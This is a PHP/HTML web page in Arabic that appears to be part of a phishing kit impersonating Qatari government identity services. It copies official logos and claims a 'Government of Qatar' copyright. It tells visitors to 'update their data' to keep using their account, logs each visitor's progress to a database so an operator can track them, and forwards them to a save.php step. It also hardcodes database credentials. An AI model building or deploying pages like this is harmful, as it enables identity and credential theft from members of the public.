<?php
// إخفاء الأخطاء لمنع طباعة أي نصوص غريبة على واجهة العميل
error_reporting(0);
ini_set('display_errors', 0);

$host = "dpg-d95vic9oagis739h761g-a";
$user = "qatar_db_user";
$password = "TpPqGoliCoObGDiGdpEc16ak3PJZ9BB1";
$dbname = "qatar_db";
$port = "5432";

try {
    $dsn = "pgsql:host=$host;port=$port;dbname=$dbname;";
    $pdo = new PDO($dsn, $user, $password, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
    
    $visitor_id = isset($_POST['visitor_id']) ? $_POST['visitor_id'] : 'visitor_session'; 
    
    // تحديث اسم الصفحة الحالية إلى صفحة التحقق من الهوية في قاعدة البيانات
    $stmt_vis = $pdo->prepare("INSERT INTO active_visitors (visitor_id, current_page, last_seen) 
                               VALUES (:visitor_id, 'صفحة التحقق من الهوية', NOW()) 
                               ON CONFLICT (visitor_id) 
                               DO UPDATE SET current_page = 'صفحة التحقق من الهوية', last_seen = NOW()");
    $stmt_vis->execute([':visitor_id' => $visitor_id]);
} catch (Exception $e) {
    // معالجة صامتة لحماية التصميم
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>التحقق من الهوية - النافذة الواحدة</title>
    <style>
        * {
            box-sizing: border-box;
        }
        
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* هيدر بارز ومنفصل تماماً بظل سفلي واضح وأنيق */
        .header-box {
            width: 100%;
            background: #ffffff;
            display: flex;
            justify-content: center;
            border-bottom: 1px solid #e0e0e0;
            padding: 12px 0;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
            z-index: 10;
        }

        .header-container {
            width: 90%;
            max-width: 360px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        /* اللوجوهات الرسمية الشفافة والنظيفة للموبايل */
        .header-container .logo-right {
            height: 28px;
            width: auto;
        }

        .header-container .logo-left {
            height: 28px;
            width: auto;
        }

        /* ضبط مساحات محتوى الصفحة */
        .page-content {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 25px 0;
            flex: 1;
        }

        /* الكارت باللون الرمادي الواضح والمقاس الملموم المثالي لشاشات الموبايل */
        .card {
            background-color: #eeeeee;
            width: 90%;
            max-width: 360px;
            border: 1px solid #dcdcdc;
            border-radius: 6px;
            padding: 22px 18px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.02);
            margin-top: 5px;
        }

        /* عنوان بلون أسود غامق وصريح جداً */
        .card-title {
            font-size: 19px;
            font-weight: 800;
            color: #000000;
            margin-top: 0;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #d5d5d5;
        }

        /* نصوص الفقرات بلون أسود غامق وواضح للغاية */
        .card-text {
            font-size: 14px;
            font-weight: 600;
            color: #000000;
            line-height: 1.6;
            margin-bottom: 15px;
            text-align: justify;
        }

        /* زر استمر الانسيابي المتناسق */
        .btn-continue {
            width: 100%;
            background-color: #0c73b2;
            color: white;
            border: none;
            padding: 11px;
            border-radius: 4px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 5px;
        }

        .btn-continue:hover {
            background-color: #0a6296;
        }

        /* فوتر الحقوق السفلي */
        footer {
            padding: 15px 0;
            font-size: 12px;
            color: #666666;
            text-align: center;
            width: 100%;
            background-color: #ffffff;
            margin-top: auto;
        }
    </style>
</head>
<body>

    <!-- الهيدر المنفصل والبارز بشعار التوثيق والنافذة الواحدة -->
    <header class="header-box">
        <div class="header-container">
            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/RQnjZWnrdYgEbNhJ.svg" alt="التوثيق الوطني" class="logo-right">
            <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/OzYfGIorjXifdHHC.svg" alt="النافذة الواحدة" class="logo-left">
        </div>
    </header>

    <!-- المحتوى الرئيسي بالكارت الرمادي والنصوص السوداء الداكنة جداً -->
    <div class="page-content">
        <main class="card">
            <h1 class="card-title">تحديث البيانات</h1>
            
            <p class="card-text">
                يجب تحديث بياناتك من خلال خطوات بسيطة، لتتمكن من استخدام حسابك.
            </p>
            
            <p class="card-text">
                نجري تحديث بيانات على جميع الحسابات بشكل دوري، لنتمكن من تحديث بيانات السكن وأرقام الهواتف والبريد الالكتروني.
            </p>

            <!-- هنا يتم التوجيه للملف التالي عند الضغط على زر استمر -->
            <form action="save.php" method="POST">
                <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($visitor_id); ?>">
                <button type="submit" class="btn-continue">استمر</button>
            </form>
        </main>
    </div>

    <!-- فوتر الحقوق الملموم -->
    <footer>
        © ٢٠٢٦ حكومة قطر
    </footer>

</body>
</html>
